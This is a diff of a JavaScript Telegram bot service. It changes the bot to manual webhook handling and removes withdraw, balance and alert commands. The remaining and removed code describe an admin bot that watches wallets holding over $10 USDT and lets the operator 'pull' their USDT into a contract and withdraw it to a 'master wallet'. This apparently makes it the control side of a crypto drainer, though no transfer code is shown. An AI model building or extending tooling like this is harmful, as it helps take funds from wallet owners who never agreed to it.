@@ -11,7 +11,6 @@ class TelegramService {
         this.isInitialized = false;
     }
 
-    // Simple initialization - works with both polling and webhook
     init() {
         if (!this.botToken) {
             console.log('⚠️ Telegram bot token not found, skipping bot initialization');
@@ -19,14 +18,14 @@ class TelegramService {
         }
         
         try {
-            // Create bot instance - Render will handle webhook setup
-            this.bot = new TelegramBot(this.botToken);
+            // Create bot instance - we'll handle updates manually
+            this.bot = new TelegramBot(this.botToken, { polling: false });
             
             // Set up command handlers
             this.setupCommandHandlers();
             this.isInitialized = true;
             
-            console.log('✅ Telegram bot initialized');
+            console.log('✅ Telegram bot initialized (manual update mode)');
         } catch (error) {
             console.error('❌ Telegram bot initialization failed:', error.message);
         }
@@ -53,18 +52,6 @@ class TelegramService {
             const walletAddress = match[1];
             this.handlePullCommand(msg.chat.id, walletAddress);
         });
-
-        // Withdraw command
-        this.bot.onText(/\/withdraw/, (msg) => {
-            console.log('Received /withdraw command from chat:', msg.chat.id);
-            this.handleWithdrawCommand(msg.chat.id);
-        });
-
-        // Balances command
-        this.bot.onText(/\/balances/, (msg) => {
-            console.log('Received /balances command from chat:', msg.chat.id);
-            this.handleBalancesCommand(msg.chat.id);
-        });
     }
 
     async sendWelcomeMessage(chatId) {
@@ -73,8 +60,6 @@ class TelegramService {
 
 Available commands:
 • /pull_<address> - Pull USDT from wallet
-• /withdraw - Withdraw all USDT from contract
-• /balances - Check all wallet balances
 • /help - Show this help message
 
 Security Note: Only authorized admins can execute sensitive commands.
@@ -113,42 +98,6 @@ Actions:
         }
     }
 
-    async sendBalanceAlert(walletAddress, balance) {
-        if (!this.bot || !this.adminChatId) return;
-        
-        const message = `
-💰 BALANCE ALERT
-Address: ${walletAddress}
-USDT Balance: ${balance} USDT (> $10)
-
-Actions:
-• /pull_${walletAddress} - Pull USDT to contract
-        `;
-        
-        try {
-            return await this.bot.sendMessage(this.adminChatId, message);
-        } catch (error) {
-            console.error('Error sending balance alert:', error.message);
-        }
-    }
-
-    async sendSuccessMessage(walletAddress, amount, txHash) {
-        if (!this.bot || !this.adminChatId) return;
-        
-        const message = `
-✅ SUCCESSFUL PULL
-Address: ${walletAddress}
-Amount: ${amount} USDT
-Transaction: ${txHash}
-        `;
-        
-        try {
-            return await this.bot.sendMessage(this.adminChatId, message);
-        } catch (error) {
-            console.error('Error sending success message:', error.message);
-        }
-    }
-
     async handlePullCommand(chatId, walletAddress) {
         if (chatId.toString() !== this.adminChatId) {
             return this.bot.sendMessage(chatId, '❌ Unauthorized access');
@@ -173,45 +122,11 @@ Processing... This will:
         return this.bot.sendMessage(chatId, message);
     }
 
-    async handleWithdrawCommand(chatId) {
-        if (chatId.toString() !== this.adminChatId) {
-            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
-        }
-        
-        const message = `
-🏦 Withdraw Operation Initiated
-Withdrawing all USDT from contract to master wallet...
-        `;
-        
-        return this.bot.sendMessage(chatId, message);
-    }
-
-    async handleBalancesCommand(chatId) {
-        if (chatId.toString() !== this.adminChatId) {
-            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
-        }
-        
-        const message = `
-📊 Wallet Balances Requested
-Fetching wallet balances... This may take a moment.
-        `;
-        
-        return this.bot.sendMessage(chatId, message);
-    }
-
-    async sendMessage(chatId, message, options = {}) {
-        if (!this.bot) return;
-        try {
-            return await this.bot.sendMessage(chatId, message, options);
-        } catch (error) {
-            console.error('Error sending message:', error.message);
-        }
-    }
-
-    // Process webhook updates
+    // Process webhook updates manually
     async processUpdate(update) {
         if (this.bot) {
             try {
+                console.log('Processing Telegram update:', JSON.stringify(update, null, 2));
                 await this.bot.processUpdate(update);
             } catch (error) {
                 console.error('Error processing Telegram update:', error.message);
